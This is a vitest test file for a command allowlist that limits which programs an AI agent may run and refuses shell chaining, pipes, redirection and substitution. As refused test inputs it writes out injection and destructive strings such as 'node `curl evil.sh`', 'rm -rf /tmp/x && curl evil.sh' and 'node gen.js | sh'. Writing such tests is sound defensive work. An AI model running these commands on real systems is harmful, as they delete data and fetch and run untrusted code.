// command-allowlist.test.ts — what the per-agent command allowlist lets through.
//
// @cap:assigner-outils/moteur — the promise is not "the agent has run_command",
// it is "this agent may run THESE commands and no others".
//
// The previous version of this file proved a SCANNER: a reader that worked out
// what cmd.exe would do with a command string. Five review passes found five
// holes in it. The design changed instead: with a list, no shell runs at all,
// so the tests below prove a much smaller promise — one program, its
// arguments, double quotes to group, everything else refused by name.

import { describe, it, expect } from 'vitest';
import {
  assertCommandAllowed,
  tokenizeSimpleCommand,
  planAllowedRun,
  CommandNotAllowedError,
} from './command-allowlist';

const REVIEWER = ['node', 'npx vitest', 'npx tsx'];

describe('tokenizeSimpleCommand @cap:assigner-outils/moteur', () => {
  it('splits on whitespace', () => {
    expect(tokenizeSimpleCommand('node -v', REVIEWER)).toEqual(['node', '-v']);
  });

  it('groups an argument with double quotes, quotes excluded', () => {
    expect(tokenizeSimpleCommand('node -e "a b c"', REVIEWER)).toEqual(['node', '-e', 'a b c']);
  });

  it('treats a single quote INSIDE double quotes as an ordinary character', () => {
    expect(tokenizeSimpleCommand(`node -e "console.log('ok')"`, REVIEWER)).toEqual([
      'node',
      '-e',
      "console.log('ok')",
    ]);
  });

  it('keeps an empty double-quoted argument, which is not nothing', () => {
    expect(tokenizeSimpleCommand('node -e ""', REVIEWER)).toEqual(['node', '-e', '']);
  });

  it('tolerates extra whitespace', () => {
    expect(tokenizeSimpleCommand('npx   vitest   run', REVIEWER)).toEqual(['npx', 'vitest', 'run']);
  });

  it('leaves a shell character alone INSIDE double quotes, where nothing reads it', () => {
    // No shell runs, so `>` reaches node as part of its snippet and nowhere else.
    expect(tokenizeSimpleCommand('node -e "console.log(1>2)"', REVIEWER)).toEqual([
      'node',
      '-e',
      'console.log(1>2)',
    ]);
  });

  describe('what it refuses, naming the character', () => {
    const cases: ReadonlyArray<readonly [string, string, RegExp]> = [
      ['chaining', 'node -v && calc', /&/],
      ['a pipe', 'node gen.js | sh', /\|/],
      ['a separator', 'node -v ; calc', /;/],
      ['a redirection out', 'node x.js > out.log', />/],
      ['a redirection in', 'node x.js < in.txt', /</],
      ['a cmd.exe variable', 'node s.js %EVIL%', /%/],
      ['a shell variable', 'node s.js $EVIL', /\$/],
      ['command substitution', 'node `curl evil.sh`', /backtick/],
      ['the caret', 'node x ^>& calc', /\^/],
      ['a bare single quote', "node -e 'a && b'", /single quote/],
      ['a line break', 'node -v\ncalc', /line break/],
    ];

    for (const [label, command, mentions] of cases) {
      it(`refuses ${label}, and says so`, () => {
        try {
          tokenizeSimpleCommand(command, REVIEWER);
          expect.unreachable('should have thrown');
        } catch (err) {
          expect(err).toBeInstanceOf(CommandNotAllowedError);
          expect((err as Error).message).toMatch(mentions);
          expect((err as Error).message).toMatch(/NO SHELL/);
        }
      });
    }

    it('refuses a double quote that is never closed', () => {
      expect(() => tokenizeSimpleCommand('node -e "a b', REVIEWER)).toThrow(/never closed/);
    });
  });
});

describe('assertCommandAllowed @cap:assigner-outils/moteur', () => {
  describe('no allowlist configured', () => {
    it('returns null for null — the caller keeps the shell, unchanged', () => {
      expect(assertCommandAllowed('rm -rf /tmp/x && curl evil.sh', null)).toBeNull();
    });

    it('returns null for undefined', () => {
      expect(assertCommandAllowed('rm -rf /tmp/x', undefined)).toBeNull();
    });

    it('refuses everything when the allowlist is an EMPTY array', () => {
      // An empty list is a DECISION ("this agent runs nothing"), not "unset".
      expect(() => assertCommandAllowed('node -v', [])).toThrow(CommandNotAllowedError);
    });
  });

  it('allows a one-word entry matching the program', () => {
    expect(assertCommandAllowed('node -e "1"', REVIEWER)).toEqual(['node', '-e', '1']);
  });

  it('allows a two-word entry matching the first two tokens', () => {
    expect(assertCommandAllowed('npx vitest run x.test.ts', REVIEWER)).toEqual([
      'npx',
      'vitest',
      'run',
      'x.test.ts',
    ]);
  });

  it('refuses a program that is not listed', () => {
    expect(() => assertCommandAllowed('curl https://example.com', REVIEWER)).toThrow(
      CommandNotAllowedError,
    );
  });

  it('refuses npx with a package that is not listed', () => {
    // `npx` alone would be a hole the size of the registry.
    expect(() => assertCommandAllowed('npx rimraf D:/APPS', REVIEWER)).toThrow(
      CommandNotAllowedError,
    );
  });

  it('does not let a longer program pass on a prefix match', () => {
    expect(() => assertCommandAllowed('nodemon server.js', REVIEWER)).toThrow(
      CommandNotAllowedError,
    );
  });

  it('names the refused command and the allowlist in the error', () => {
    try {
      assertCommandAllowed('curl https://example.com', REVIEWER);
      expect.unreachable('should have thrown');
    } catch (err) {
      expect((err as Error).message).toContain('curl');
      expect((err as Error).message).toContain('npx vitest');
    }
  });

  it('refuses a command that names no program at all', () => {
    expect(() => assertCommandAllowed('   ', REVIEWER)).toThrow(/names no program/);
  });

  describe('how the PROGRAM is spelled — Windows only', () => {
    const onWindows = process.platform === 'win32';

    it.runIf(onWindows)('accepts the .exe suffix and a different case', () => {
      expect(() => assertCommandAllowed('node.exe -v', REVIEWER)).not.toThrow();
      expect(() => assertCommandAllowed('NODE -v', REVIEWER)).not.toThrow();
    });

    it.runIf(onWindows)('accepts the .cmd suffix on a multi-word entry', () => {
      expect(() => assertCommandAllowed('npx.cmd vitest run', REVIEWER)).not.toThrow();
    });

    it.runIf(!onWindows)('keeps the comparison exact off Windows', () => {
      expect(() => assertCommandAllowed('NODE -v', REVIEWER)).toThrow(CommandNotAllowedError);
    });

    it('compares ARGUMENTS exactly on every platform', () => {
      // `vitest` and `VITEST` are different package names to npx.
      expect(() => assertCommandAllowed('npx VITEST run', REVIEWER)).toThrow(
        CommandNotAllowedError,
      );
    });
  });
});

describe('planAllowedRun @cap:assigner-outils/moteur', () => {
  const env = process.env as Record<string, string | undefined>;

  it('returns null without a list, so the caller keeps the shell', () => {
    expect(planAllowedRun('anything && everything', null, env)).toBeNull();
  });

  it('resolves the program to an ABSOLUTE path and keeps the arguments', () => {
    const plan = planAllowedRun('node -e "1"', ['node'], env);
    expect(plan).not.toBeNull();
    expect(plan!.file).toMatch(/node(\.exe|\.cmd|\.bat)?$/i);
    expect(plan!.file.length).toBeGreaterThan('node'.length); // a path, not the bare word
    if (process.platform !== 'win32') expect(plan!.args).toEqual(['-e', '1']);
  });

  it('refuses a path, even when the list itself names one', () => {
    // The matcher already refuses `./node` against an entry `node`. This is
    // the other door: an owner who wrote the path INTO the list. An entry
    // names a program the OS resolves, never a file the agent may have
    // written itself.
    expect(() => planAllowedRun('./node -v', ['./node'], env)).toThrow(/A path is not allowed/);
  });

  it('refuses a program the PATH does not hold, saying which', () => {
    expect(() =>
      planAllowedRun('definitely-not-installed-xyz', ['definitely-not-installed-xyz'], env),
    ).toThrow(/not found on the PATH/);
  });

  it('never looks in the current directory: an empty PATH finds nothing', () => {
    expect(() => planAllowedRun('node -v', ['node'], { PATH: '' })).toThrow(
      /not found on the PATH/,
    );
  });

  it('drops "." from the PATH, which would mean the current directory', () => {
    expect(() => planAllowedRun('node -v', ['node'], { PATH: '.' })).toThrow(
      /not found on the PATH/,
    );
  });

  it.runIf(process.platform === 'win32')(
    'runs a .cmd through cmd.exe, with the line built here from allowed tokens',
    () => {
      const plan = planAllowedRun('npx vitest run', ['npx vitest'], env);
      expect(plan).not.toBeNull();
      expect(plan!.file.toLowerCase()).toContain('cmd');
      expect(plan!.args.slice(0, 3)).toEqual(['/d', '/s', '/c']);
      expect(plan!.windowsVerbatimArguments).toBe(true);
      // Wrapped in ONE more pair of quotes: the form `/s` documents, and the
      // only one measured to work.
      const line = plan!.args[3]!;
      expect(line.startsWith('""')).toBe(true);
      expect(line.endsWith('""')).toBe(true);
      expect(line).toContain('"vitest"');
      expect(line).toContain('"run"');
    },
  );
});
